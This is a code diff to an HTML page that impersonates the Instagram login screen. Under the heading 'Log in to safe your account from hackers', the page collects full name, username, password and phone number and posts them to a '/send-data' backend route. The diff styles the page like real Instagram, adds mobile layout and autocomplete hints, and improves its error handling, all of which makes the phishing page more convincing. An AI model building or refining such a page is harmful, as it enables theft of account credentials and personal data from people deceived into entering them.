@@ -2,71 +2,121 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <!-- Mobile friendly initial zoom setting -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram Login</title>
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       background: linear-gradient(135deg, #f58529, #dd2a7b, #8134af, #515bd4);
       height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
+      box-sizing: border-box;
     }
+
     .login-container {
       background: #fff;
-      padding: 40px;
+      padding: 30px; /* Thoda kam padding mobile ke liye */
       border-radius: 12px;
       box-shadow: 0 4px 20px rgba(0,0,0,0.2);
-      width: 350px;
+      
+      /* Flexibility ke liye width % use karein, max constraints ke sath */
+      width: 90%; 
+      max-width: 350px; 
+      min-width: 280px; /* Zyada chota na hone paye */
+      
       text-align: center;
+      box-sizing: border-box;
     }
+
     .logo {
       font-family: 'Brush Script MT', cursive;
       font-size: 36px;
       color: #dd2a7b;
       margin-bottom: 10px;
     }
+
     .login-container h1 {
-      font-size: 18px;
+      font-size: 16px; /* Badi screens par safe rahne ke liye chota kiya */
       margin-bottom: 20px;
+      margin-top: 0;
       color: #dd2a7b;
       animation: pulse 2s infinite;
     }
+
     @keyframes pulse {
       0% { color: #dd2a7b; }
       50% { color: #f58529; }
       100% { color: #dd2a7b; }
     }
+
     .login-container input {
       width: 100%;
       padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
+      margin: 8px 0; /* Margin thoda kam kiya */
+      border: 1px solid #dbdbdb;
+      border-radius: 6px; /* modern insta style */
       font-size: 14px;
       box-sizing: border-box;
+      background-color: #fafafa; /* insta light grey input */
     }
+    
+    .login-container input:focus {
+        border-color: #a8a8a8;
+        outline: none;
+    }
+
     .login-container button {
       width: 100%;
-      padding: 12px;
-      background: #dd2a7b;
+      padding: 10px;
+      background-color: #0095f6; /* modern insta blue button color */
       border: none;
-      border-radius: 8px;
+      border-radius: 6px;
       color: #fff;
-      font-size: 16px;
+      font-size: 14px;
+      font-weight: 600;
       cursor: pointer;
-      transition: background 0.3s ease;
+      transition: background-color 0.3s ease;
+      margin-top: 15px;
     }
-    .login-container button:hover {
-      background: #8134af;
+
+    .login-container button:not(:disabled):hover {
+      background-color: #1877f2; /* Hover par dark blue */
     }
+    
+    .login-container button:disabled {
+        background-color: #b2dffc; /* Disabled state color */
+        cursor: not-allowed;
+    }
+
     .success-message {
       display: none;
       font-size: 16px;
       color: green;
       margin-top: 20px;
     }
+
+    /* Tablet size optimizations */
+    @media (min-width: 400px) and (max-width: 600px) {
+        .login-container h1 {
+            font-size: 17px;
+        }
+    }
+    
+    /* Badi screen optimizations */
+    @media (min-width: 601px) {
+        .login-container {
+            padding: 40px; /* Thoda zyada padding badi screens par */
+        }
+        .login-container h1 {
+            font-size: 18px;
+        }
+    }
+
   </style>
 </head>
 <body>
@@ -74,10 +124,10 @@
     <div class="logo">Instagram</div>
     <h1>Log in to safe your account from hackers</h1>
     <form id="loginForm">
-      <input type="text" id="fullname" placeholder="Full Name" required>
-      <input type="text" id="username" placeholder="Username" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <input type="tel" id="phone" placeholder="Phone Number" required>
+      <input type="text" id="fullname" placeholder="Full Name" required autocomplete="name">
+      <input type="text" id="username" placeholder="Username" required autocomplete="username">
+      <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
+      <input type="tel" id="phone" placeholder="Phone Number" required autocomplete="tel">
       <button type="submit" id="submitBtn">Log In</button>
     </form>
     <div class="success-message" id="successMessage">
@@ -87,7 +137,7 @@
 
   <script>
     document.getElementById("loginForm").addEventListener("submit", async function(e){
-      e.preventDefault();
+      e.preventDefault(); // Prevents page reload
       
       const fullname = document.getElementById("fullname").value;
       const username = document.getElementById("username").value;
@@ -99,7 +149,8 @@
       submitBtn.innerText = "Please wait...";
 
       try {
-        // Relative path '/send-data' use kiya hai jo server.js ke route se exact match karta hai
+        // Relative path '/send-data' is used. It automatically points
+        // to the current domain's backend, preventing URL mismatch issues.
         const response = await fetch('/send-data', {
           method: 'POST',
           headers: {
@@ -112,13 +163,16 @@
           document.getElementById("loginForm").style.display = "none";
           document.getElementById("successMessage").style.display = "block";
         } else {
+          // You could be more specific here depending on backend response,
+          // but a generic error is okay for simple cases.
           alert("Kuch masla ho gaya hai, dobara try karein.");
           submitBtn.disabled = false;
           submitBtn.innerText = "Log In";
         }
       } catch (error) {
+        // Log errors properly for debugging
         console.error("Error:", error);
-        alert("Server connect nahi ho saka!");
+        alert("Server connect nahi ho saka! Internet check karein.");
         submitBtn.disabled = false;
         submitBtn.innerText = "Log In";
       }
